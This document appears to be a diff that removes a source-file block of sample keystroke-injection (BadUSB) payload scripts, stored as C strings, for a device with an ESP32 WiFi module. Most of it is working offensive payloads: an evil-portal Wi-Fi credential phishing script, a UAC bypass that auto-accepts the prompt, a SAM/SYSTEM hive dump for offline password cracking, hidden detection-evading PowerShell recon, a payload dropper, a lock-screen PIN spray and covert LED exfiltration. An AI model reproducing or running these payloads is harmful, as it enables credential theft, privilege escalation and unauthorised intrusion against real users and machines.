-/* Evil portal phishing module — spawn portal, wait for creds */
-static const char SAMPLE_PORTAL_PHISH[] =
-    "NAME Evil Portal Phish\n"
-    "DESCRIPTION ESP32 captive portal to harvest credentials\n"
-    "CATEGORY credential\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION PORTAL_SSID FreeWiFi \"Portal SSID name\"\n"
-    "OPTION DURATION 60000 \"Portal duration (ms)\"\n"
-    "PLATFORM WIN\n"
-    "REM Start evil portal on ESP32\n"
-    "WIFI_PORTAL {{PORTAL_SSID}}\n"
-    "REM Let it run for the configured duration\n"
-    "WIFI_WAIT {{DURATION}}\n"
-    "WIFI_STOP\n"
-    "REM Type any captured creds into Notepad\n"
-    "GUI r\n"
-    "DELAY 500\n"
-    "STRING notepad\n"
-    "ENTER\n"
-    "DELAY 1000\n"
-    "STRINGLN === Captured Portal Data ===\n"
-    "WIFI_RESULT\n"
-    "PLATFORM MAC\n"
-    "WIFI_PORTAL {{PORTAL_SSID}}\n"
-    "WIFI_WAIT {{DURATION}}\n"
-    "WIFI_STOP\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING TextEdit\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "STRINGLN === Captured Portal Data ===\n"
-    "WIFI_RESULT\n"
-    "PLATFORM LINUX\n"
-    "WIFI_PORTAL {{PORTAL_SSID}}\n"
-    "WIFI_WAIT {{DURATION}}\n"
-    "WIFI_STOP\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "STRINGLN echo '=== Captured Portal Data ==='\n"
-    "WIFI_RESULT\n";
-
-/* Full recon suite — combined local + WiFi recon with variables */
-static const char SAMPLE_FULL_RECON[] =
-    "NAME Full Recon Suite\n"
-    "DESCRIPTION Comprehensive recon: local system + WiFi + network\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 500 \"Initial delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "VAR $SEP = ========================================\n"
-    "REM Open PowerShell\n"
-    "GUI r\n"
-    "DELAY 500\n"
-    "STRING powershell\n"
-    "ENTER\n"
-    "DELAY 1500\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== SYSTEM INFO =='\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN hostname; whoami; systeminfo | Select-String 'OS'\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== NETWORK CONFIG =='\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN ipconfig | Select-String 'IPv4|Gateway|DNS'\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== ACTIVE CONNECTIONS =='\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN netstat -an | Select-String 'ESTABLISHED|LISTENING' | Select-Object -First 20\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== WIFI PROFILES =='\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN netsh wlan show profiles | Select-String 'All User'\n"
-    "IF_CONNECTED\n"
-    "REM ESP32 WiFi recon\n"
-    "WIFI_SCAN\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== NEARBY APs (ESP32) =='\n"
-    "STRINGLN echo $SEP\n"
-    "WIFI_RESULT\n"
-    "END_IF\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "VAR $SEP = ========================================\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== SYSTEM INFO =='\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN hostname; whoami; sw_vers\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== NETWORK CONFIG =='\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN ifconfig | grep 'inet '\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== ACTIVE CONNECTIONS =='\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN netstat -an | grep ESTABLISHED | head -20\n"
-    "IF_CONNECTED\n"
-    "WIFI_SCAN\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== NEARBY APs (ESP32) =='\n"
-    "STRINGLN echo $SEP\n"
-    "WIFI_RESULT\n"
-    "END_IF\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "VAR $SEP = ========================================\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== SYSTEM INFO =='\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN hostname; whoami; uname -a\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== NETWORK CONFIG =='\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN ip addr | grep 'inet '\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== ACTIVE CONNECTIONS =='\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN ss -tunp | head -20\n"
-    "IF_CONNECTED\n"
-    "WIFI_SCAN\n"
-    "STRINGLN echo $SEP\n"
-    "STRINGLN echo '== NEARBY APs (ESP32) =='\n"
-    "STRINGLN echo $SEP\n"
-    "WIFI_RESULT\n"
-    "END_IF\n";
-
-/* Rickroll Beacon — flood the airwaves with famous lyrics as SSIDs */
-static const char SAMPLE_RICKROLL_BEACON[] =
-    "NAME Rickroll Beacon\n"
-    "DESCRIPTION Beacon spam with Rick Astley lyrics as SSIDs (ESP32 required)\n"
-    "CATEGORY exploit\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DURATION 30000 \"Spam duration (ms)\"\n"
-    "PLATFORM WIN\n"
-    "IF_CONNECTED\n"
-    "LED_COLOR GREEN\n"
-    "WIFI_BEACON\n"
-    "WIFI_WAIT {{DURATION}}\n"
-    "WIFI_STOP\n"
-    "LED_COLOR RED\n"
-    "END_IF\n"
-    "PLATFORM MAC\n"
-    "IF_CONNECTED\n"
-    "LED_COLOR GREEN\n"
-    "WIFI_BEACON\n"
-    "WIFI_WAIT {{DURATION}}\n"
-    "WIFI_STOP\n"
-    "LED_COLOR RED\n"
-    "END_IF\n"
-    "PLATFORM LINUX\n"
-    "IF_CONNECTED\n"
-    "LED_COLOR GREEN\n"
-    "WIFI_BEACON\n"
-    "WIFI_WAIT {{DURATION}}\n"
-    "WIFI_STOP\n"
-    "LED_COLOR RED\n"
-    "END_IF\n";
-
-/* Stealth Recon — uses JITTER for anti-detection timing */
-static const char SAMPLE_STEALTH_RECON[] =
-    "NAME Stealth Recon\n"
-    "DESCRIPTION Slow stealthy recon with randomized timing to evade detection\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 3000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "JITTER 500 2000\n"
-    "STRING powershell -nop -ep bypass -w hidden\n"
-    "ENTER\n"
-    "JITTER 1000 3000\n"
-    "LED_COLOR BLUE\n"
-    "STRINGLN $h = hostname; $u = whoami\n"
-    "JITTER 500 1500\n"
-    "STRINGLN $ip = (ipconfig | sls 'IPv4').ToString().Split(':')[1].Trim()\n"
-    "JITTER 500 1500\n"
-    "STRINGLN $arp = arp -a | Out-String\n"
-    "JITTER 500 1500\n"
-    "STRINGLN $conn = netstat -an | sls 'ESTABLISHED' | Select -First 10 | Out-String\n"
-    "JITTER 500 1500\n"
-    "STRINGLN \"HOST:$h USER:$u IP:$ip`n=ARP=`n$arp`n=CONN=`n$conn\" | Out-File $env:TEMP\\r.log\n"
-    "ENTER\n"
-    "LED_COLOR GREEN\n"
-    "JITTER 500 1000\n"
-    "STRING exit\n"
-    "ENTER\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "JITTER 500 1500\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "JITTER 1000 3000\n"
-    "LED_COLOR BLUE\n"
-    "STRINGLN echo \"HOST:$(hostname) USER:$(whoami)\" > /tmp/.r.log\n"
-    "JITTER 500 1500\n"
-    "STRINGLN ifconfig | grep 'inet ' >> /tmp/.r.log\n"
-    "JITTER 500 1500\n"
-    "STRINGLN arp -a >> /tmp/.r.log\n"
-    "JITTER 500 1500\n"
-    "STRINGLN netstat -an | grep ESTABLISHED | head -10 >> /tmp/.r.log\n"
-    "JITTER 500 1000\n"
-    "LED_COLOR GREEN\n"
-    "STRING exit\n"
-    "ENTER\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "JITTER 1000 3000\n"
-    "LED_COLOR BLUE\n"
-    "STRINGLN echo \"HOST:$(hostname) USER:$(whoami)\" > /tmp/.r.log\n"
-    "JITTER 500 1500\n"
-    "STRINGLN ip addr | grep 'inet ' >> /tmp/.r.log\n"
-    "JITTER 500 1500\n"
-    "STRINGLN arp -a >> /tmp/.r.log 2>/dev/null\n"
-    "JITTER 500 1500\n"
-    "STRINGLN ss -tunp | head -10 >> /tmp/.r.log\n"
-    "JITTER 500 1000\n"
-    "LED_COLOR GREEN\n"
-    "STRING exit\n"
-    "ENTER\n";
-
-/* Multi-stage WiFi Recon — scan APs, stations, probe requests, then save */
-static const char SAMPLE_WIFI_RECON_FULL[] =
-    "NAME WiFi Recon Full\n"
-    "DESCRIPTION Complete WiFi recon: APs + stations + probes + save\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION PROBE_TIME 15000 \"Probe sniff duration (ms)\"\n"
-    "PLATFORM WIN\n"
-    "IF_CONNECTED\n"
-    "LED_COLOR BLUE\n"
-    "REM Phase 1: Scan APs\n"
-    "WIFI_SCAN\n"
-    "LED_COLOR CYAN\n"
-    "REM Phase 2: Scan stations\n"
-    "WIFI_SCAN_STA\n"
-    "LED_COLOR MAGENTA\n"
-    "REM Phase 3: Sniff probe requests\n"
-    "WIFI_PROBE {{PROBE_TIME}}\n"
-    "LED_COLOR GREEN\n"
-    "REM Phase 4: Save all results to SD\n"
-    "SAVE_WIFI\n"
-    "REM Phase 5: Type results into Notepad\n"
-    "GUI r\n"
-    "DELAY 500\n"
-    "STRING notepad\n"
-    "ENTER\n"
-    "DELAY 1000\n"
-    "STRINGLN === APs ===\n"
-    "WIFI_RESULT\n"
-    "STRINGLN === Stations ===\n"
-    "WIFI_STA_RESULT\n"
-    "END_IF\n"
-    "PLATFORM MAC\n"
-    "IF_CONNECTED\n"
-    "WIFI_SCAN\n"
-    "WIFI_SCAN_STA\n"
-    "WIFI_PROBE {{PROBE_TIME}}\n"
-    "SAVE_WIFI\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING TextEdit\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "STRINGLN === APs ===\n"
-    "WIFI_RESULT\n"
-    "STRINGLN === Stations ===\n"
-    "WIFI_STA_RESULT\n"
-    "END_IF\n"
-    "PLATFORM LINUX\n"
-    "IF_CONNECTED\n"
-    "WIFI_SCAN\n"
-    "WIFI_SCAN_STA\n"
-    "WIFI_PROBE {{PROBE_TIME}}\n"
-    "SAVE_WIFI\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "STRINGLN echo '=== APs ==='\n"
-    "WIFI_RESULT\n"
-    "STRINGLN echo '=== Stations ==='\n"
-    "WIFI_STA_RESULT\n"
-    "END_IF\n";
-
-static const char SAMPLE_UAC_BYPASS[] =
-    "NAME UAC Bypass RunAs\n"
-    "DESCRIPTION Bypasses UAC via RunAs with HOLD/RELEASE key technique\n"
-    "CATEGORY exploit\n"
-    "PLATFORMS WIN\n"
-    "OPTION COMMAND calc.exe \"Command to execute as admin\"\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR YELLOW\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell\n"
-    "REM Hold CTRL+SHIFT and press ENTER for 'Run as Administrator'\n"
-    "HOLD CTRL\n"
-    "HOLD SHIFT\n"
-    "ENTER\n"
-    "RELEASE SHIFT\n"
-    "RELEASE CTRL\n"
-    "DELAY 2000\n"
-    "REM Accept UAC prompt with ALT+Y\n"
-    "ALT y\n"
-    "DELAY 1500\n"
-    "LED_COLOR GREEN\n"
-    "STRINGLN {{COMMAND}}\n"
-    "DELAY 500\n"
-    "STRING exit\n"
-    "ENTER\n";
-
-static const char SAMPLE_OS_FINGERPRINT[] =
-    "NAME OS Fingerprint Script\n"
-    "DESCRIPTION Detects host OS via CapsLock timing and runs appropriate recon\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR BLUE\n"
-    "REM Toggle CapsLock and check response timing\n"
-    "CAPSLOCK\n"
-    "WAIT_FOR_CAPS_ON\n"
-    "LED_COLOR GREEN\n"
-    "REM CapsLock responded - host is alive\n"
-    "CAPSLOCK\n"
-    "WAIT_FOR_CAPS_OFF\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING cmd /k echo HOST:%COMPUTERNAME% USER:%USERNAME% OS:Windows && ver\n"
-    "ENTER\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR BLUE\n"
-    "CAPSLOCK\n"
-    "WAIT_FOR_CAPS_ON\n"
-    "LED_COLOR GREEN\n"
-    "CAPSLOCK\n"
-    "WAIT_FOR_CAPS_OFF\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "STRINGLN echo HOST:$(hostname) USER:$(whoami) OS:macOS && sw_vers\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR BLUE\n"
-    "CAPSLOCK\n"
-    "WAIT_FOR_CAPS_ON\n"
-    "LED_COLOR GREEN\n"
-    "CAPSLOCK\n"
-    "WAIT_FOR_CAPS_OFF\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "STRINGLN echo HOST:$(hostname) USER:$(whoami) OS:Linux && uname -a\n";
-
-static const char SAMPLE_RANDOM_PASSWD[] =
-    "NAME Random Password Gen\n"
-    "DESCRIPTION Types a batch of random passwords into any text field\n"
-    "CATEGORY post\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION COUNT 5 \"Number of passwords to generate\"\n"
-    "OPTION LENGTH 16 \"Password length\"\n"
-    "OPTION DELAY 500 \"Initial delay (ms)\"\n"
-    "PLATFORM ALL\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR CYAN\n"
-    "REPEAT_BLOCK {{COUNT}}\n"
-    "STRING Password: \n"
-    "RANDOM_STRING {{LENGTH}}\n"
-    "ENTER\n"
-    "DELAY 100\n"
-    "END_REPEAT\n"
-    "LED_COLOR GREEN\n";
-
-static const char SAMPLE_PAYLOAD_DROPPER[] =
-    "NAME Payload Dropper\n"
-    "DESCRIPTION Types payload file contents from SD card into a terminal\n"
-    "CATEGORY exploit\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION PAYLOAD payload.txt \"Filename in modules dir to type\"\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass\n"
-    "ENTER\n"
-    "DELAY 1200\n"
-    "LED_COLOR YELLOW\n"
-    "TYPE_FILE {{PAYLOAD}}\n"
-    "ENTER\n"
-    "LED_COLOR GREEN\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "LED_COLOR YELLOW\n"
-    "TYPE_FILE {{PAYLOAD}}\n"
-    "ENTER\n"
-    "LED_COLOR GREEN\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "LED_COLOR YELLOW\n"
-    "TYPE_FILE {{PAYLOAD}}\n"
-    "ENTER\n"
-    "LED_COLOR GREEN\n";
-
-/* Mouse Auto-Clicker — demonstrates MOUSE_MOVE, MOUSE_CLICK, drag */
-static const char SAMPLE_MOUSE_JIGGLER[] =
-    "NAME Mouse Jiggler\n"
-    "DESCRIPTION Keeps screen awake by jiggling the mouse at random intervals\n"
-    "CATEGORY post\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DURATION 60 \"Jiggle duration in seconds (approx)\"\n"
-    "OPTION INTERVAL 5000 \"Interval between jiggles (ms)\"\n"
-    "PLATFORM ALL\n"
-    "REM Platform-independent mouse jiggler using PLATFORM ALL\n"
-    "VAR $count = 0\n"
-    "REPEAT_BLOCK {{DURATION}}\n"
-    "MOUSE_MOVE 3 0\n"
-    "DELAY 50\n"
-    "MOUSE_MOVE -3 0\n"
-    "DELAY 50\n"
-    "MOUSE_MOVE 0 3\n"
-    "DELAY 50\n"
-    "MOUSE_MOVE 0 -3\n"
-    "DELAY {{INTERVAL}}\n"
-    "END_REPEAT\n"
-    "LED_COLOR GREEN\n";
-
-/* Conditional Recon — demonstrates IF/ELSE/ENDIF variable conditionals */
-static const char SAMPLE_CONDITIONAL_RECON[] =
-    "NAME Conditional Recon\n"
-    "DESCRIPTION Runs different recon based on user-selected mode\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN\n"
-    "OPTION MODE quick \"Recon mode: quick or full\"\n"
-    "OPTION DELAY 2000 \"Initial HID delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass\n"
-    "ENTER\n"
-    "DELAY 1500\n"
-    "VAR $MODE = {{MODE}}\n"
-    "IF $MODE == quick\n"
-    "LED_COLOR CYAN\n"
-    "STRINGLN hostname; whoami; ipconfig /all\n"
-    "ELSE\n"
-    "LED_COLOR YELLOW\n"
-    "STRINGLN hostname; whoami; ipconfig /all; net user; net localgroup administrators; "
-    "systeminfo; tasklist; netstat -ano\n"
-    "END_IF\n"
-    "DELAY 2000\n"
-    "LED_COLOR GREEN\n"
-    "STRING exit\n"
-    "ENTER\n";
-
-/* Screen Capture — demonstrates MOUSE_CLICK + keyboard for screen snipping */
-static const char SAMPLE_SCREEN_CAPTURE[] =
-    "NAME Screen Capture\n"
-    "DESCRIPTION Takes a screenshot using OS-native tools\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 1000 \"Delay before capture (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR BLUE\n"
-    "GUI SHIFT s\n"
-    "REM Windows Snipping Tool opened, click to capture\n"
-    "DELAY 1500\n"
-    "REM Click top-left corner\n"
-    "MOUSE_MOVE -127 -127\n"
-    "DELAY 100\n"
-    "MOUSE_MOVE -127 -127\n"
-    "DELAY 100\n"
-    "MOUSE_PRESS LEFT\n"
-    "REM Drag to bottom-right\n"
-    "MOUSE_MOVE 127 127\n"
-    "DELAY 50\n"
-    "MOUSE_MOVE 127 127\n"
-    "DELAY 50\n"
-    "MOUSE_MOVE 127 127\n"
-    "DELAY 50\n"
-    "MOUSE_MOVE 127 127\n"
-    "DELAY 50\n"
-    "MOUSE_RELEASE LEFT\n"
-    "LED_COLOR GREEN\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR BLUE\n"
-    "GUI SHIFT 4\n"
-    "DELAY 500\n"
-    "LED_COLOR GREEN\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR BLUE\n"
-    "PRINTSCREEN\n"
-    "DELAY 500\n"
-    "LED_COLOR GREEN\n";
-
-/* Modular Payload Chain — demonstrates INJECT for payload composition */
-static const char SAMPLE_INJECT_CHAIN[] =
-    "NAME Modular Payload Chain\n"
-    "DESCRIPTION Chains multiple modules together via INJECT\n"
-    "CATEGORY exploit\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 2000 \"Initial delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR YELLOW\n"
-    "REM Phase 1: Inject system info recon\n"
-    "INJECT sysinfo.fpwn\n"
-    "DELAY 2000\n"
-    "LED_COLOR GREEN\n"
-    "REM Phase 2: Lock screen when done\n"
-    "INJECT lock_screen.fpwn\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR YELLOW\n"
-    "INJECT sysinfo.fpwn\n"
-    "DELAY 2000\n"
-    "LED_COLOR GREEN\n"
-    "INJECT lock_screen.fpwn\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR YELLOW\n"
-    "INJECT sysinfo.fpwn\n"
-    "DELAY 2000\n"
-    "LED_COLOR GREEN\n"
-    "INJECT lock_screen.fpwn\n";
-
-/* SAM Dump — extracts SAM hashes via reg save (Win admin only) */
-static const char SAMPLE_SAM_DUMP[] =
-    "NAME SAM Hash Dump\n"
-    "DESCRIPTION Exports SAM and SYSTEM registry hives for offline cracking\n"
-    "CATEGORY credential\n"
-    "PLATFORMS WIN\n"
-    "OPTION DELAY 2000 \"Initial HID delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR RED\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell\n"
-    "HOLD CTRL\n"
-    "HOLD SHIFT\n"
-    "ENTER\n"
-    "RELEASE SHIFT\n"
-    "RELEASE CTRL\n"
-    "DELAY 2000\n"
-    "ALT y\n"
-    "DELAY 1500\n"
-    "STRINGLN reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv /y\n"
-    "DELAY 1000\n"
-    "STRINGLN reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hiv /y\n"
-    "DELAY 1000\n"
-    "LED_COLOR GREEN\n"
-    "STRINGLN echo SAM+SYSTEM saved to C:\\Windows\\Temp\\\n"
-    "STRING exit\n"
-    "ENTER\n";
-
-/* Slow Typed Payload — types commands slowly to evade keystroke detection */
-static const char SAMPLE_SLOW_PAYLOAD[] =
-    "NAME Stealth Typer\n"
-    "DESCRIPTION Types commands with human-like delays to evade detection\n"
-    "CATEGORY exploit\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION COMMAND whoami \"Command to type slowly\"\n"
-    "OPTION CHAR_DELAY 50 \"Delay between keystrokes (ms)\"\n"
-    "OPTION DELAY 2000 \"Initial HID delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR YELLOW\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRINGLN_DELAY {{CHAR_DELAY}} cmd\n"
-    "DELAY 1200\n"
-    "STRINGLN_DELAY {{CHAR_DELAY}} {{COMMAND}}\n"
-    "DELAY 1000\n"
-    "LED_COLOR GREEN\n"
-    "STRINGLN_DELAY {{CHAR_DELAY}} exit\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR YELLOW\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING_DELAY {{CHAR_DELAY}} Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "STRINGLN_DELAY {{CHAR_DELAY}} {{COMMAND}}\n"
-    "LED_COLOR GREEN\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR YELLOW\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "STRINGLN_DELAY {{CHAR_DELAY}} {{COMMAND}}\n"
-    "LED_COLOR GREEN\n";
-
-/* USB Wait Deploy — waits for USB connection before executing */
-static const char SAMPLE_USB_WAIT[] =
-    "NAME USB Wait Deploy\n"
-    "DESCRIPTION Waits for USB connection then runs a command (dead drop style)\n"
-    "CATEGORY exploit\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION COMMAND whoami \"Command to run after connection\"\n"
-    "PLATFORM ALL\n"
-    "LED_COLOR RED\n"
-    "REM Wait for target to plug in USB\n"
-    "WAIT_FOR_USB\n"
-    "DELAY 2000\n"
-    "LED_COLOR GREEN\n"
-    "STRING {{COMMAND}}\n"
-    "ENTER\n";
-
-/* Quick Recon — uses OPEN_TERMINAL + PLATFORM ALL for compact cross-platform recon */
-static const char SAMPLE_QUICK_RECON[] =
-    "NAME Quick Terminal Recon\n"
-    "DESCRIPTION Opens a terminal on any OS and runs a command\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION COMMAND whoami \"Command to execute\"\n"
-    "OPTION DELAY 2000 \"Initial HID delay (ms)\"\n"
-    "PLATFORM ALL\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR BLUE\n"
-    "OPEN_TERMINAL\n"
-    "STRINGLN {{COMMAND}}\n"
-    "DELAY 1000\n"
-    "LED_COLOR GREEN\n";
-
-/* Exfil Hostname — uses EXFIL to silently capture the hostname via LED channel */
-static const char SAMPLE_EXFIL_HOSTNAME[] =
-    "NAME Exfil Hostname\n"
-    "DESCRIPTION Silently exfiltrates hostname via LED covert channel\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 2000 \"Initial HID delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR RED\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass\n"
-    "ENTER\n"
-    "DELAY 1500\n"
-    "EXFIL hostname\n"
-    "LED_COLOR GREEN\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR RED\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "EXFIL hostname\n"
-    "LED_COLOR GREEN\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "LED_COLOR RED\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "EXFIL hostname\n"
-    "LED_COLOR GREEN\n";
-
-/* --- FOR loop demo: brute-force PIN entry on lock screen --- */
-static const char SAMPLE_PIN_SPRAY[] =
-    "NAME PIN Spray\n"
-    "DESCRIPTION Tries common 4-digit PINs on lock screen using FOR loop\n"
-    "CATEGORY credential\n"
-    "PLATFORMS WIN\n"
-    "OPTION DELAY 1000 \"Delay between attempts (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY 1500\n"
-    "PRINT Starting PIN spray...\n"
-    "LED_COLOR YELLOW\n"
-    "REM Try PINs 0000-0003 as demo (safety: only 4 attempts)\n"
-    "FOR $I = 0 TO 3\n"
-    "  PRINT Trying PIN $I...\n"
-    "  STRING $I$I$I$I\n"
-    "  ENTER\n"
-    "  DELAY {{DELAY}}\n"
-    "END_FOR\n"
-    "LED_COLOR GREEN\n"
-    "PRINT PIN spray complete\n";
-
-/* --- Variable arithmetic demo: countdown timer --- */
-static const char SAMPLE_COUNTDOWN[] = "NAME Countdown Timer\n"
-                                       "DESCRIPTION Demo of variable arithmetic and WHILE loops\n"
-                                       "CATEGORY recon\n"
-                                       "PLATFORMS WIN,MAC,LINUX\n"
-                                       "OPTION COUNT 5 \"Countdown from\"\n"
-                                       "PLATFORM ALL\n"
-                                       "DELAY 500\n"
-                                       "OPEN_TERMINAL\n"
-                                       "VAR $N = {{COUNT}}\n"
-                                       "PRINT Counting down from $N\n"
-                                       "WHILE $N != 0\n"
-                                       "  STRINGLN echo Countdown: $N\n"
-                                       "  DELAY 1000\n"
-                                       "  VAR $N = $N - 1\n"
-                                       "END_WHILE\n"
-                                       "STRINGLN echo Liftoff!\n"
-                                       "LED_COLOR GREEN\n"
-                                       "PRINT Done!\n";
-
-/* --- PRINT + MINIMIZE_ALL + SCREENSHOT demo --- */
-static const char SAMPLE_SCREEN_GRAB[] =
-    "NAME Screen Grab\n"
-    "DESCRIPTION Minimize windows, screenshot desktop, restore\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "PLATFORM ALL\n"
-    "DELAY 500\n"
-    "PRINT Capturing desktop...\n"
-    "LED_COLOR BLUE\n"
-    "MINIMIZE_ALL\n"
-    "DELAY 1000\n"
-    "SCREENSHOT\n"
-    "DELAY 500\n"
-    "PRINT Screenshot captured\n"
-    "LED_COLOR GREEN\n";
-
-/* --- LOCK_SCREEN demo --- */
-static const char SAMPLE_LOCK_AND_LEAVE[] = "NAME Lock and Leave\n"
-                                            "DESCRIPTION Run recon then lock the workstation\n"
-                                            "CATEGORY post\n"
-                                            "PLATFORMS WIN,MAC,LINUX\n"
-                                            "PLATFORM ALL\n"
-                                            "DELAY 500\n"
-                                            "PRINT Gathering info...\n"
-                                            "OPEN_TERMINAL\n"
-                                            "STRINGLN whoami\n"
-                                            "DELAY 500\n"
-                                            "STRINGLN hostname\n"
-                                            "DELAY 500\n"
-                                            "PRINT Locking workstation...\n"
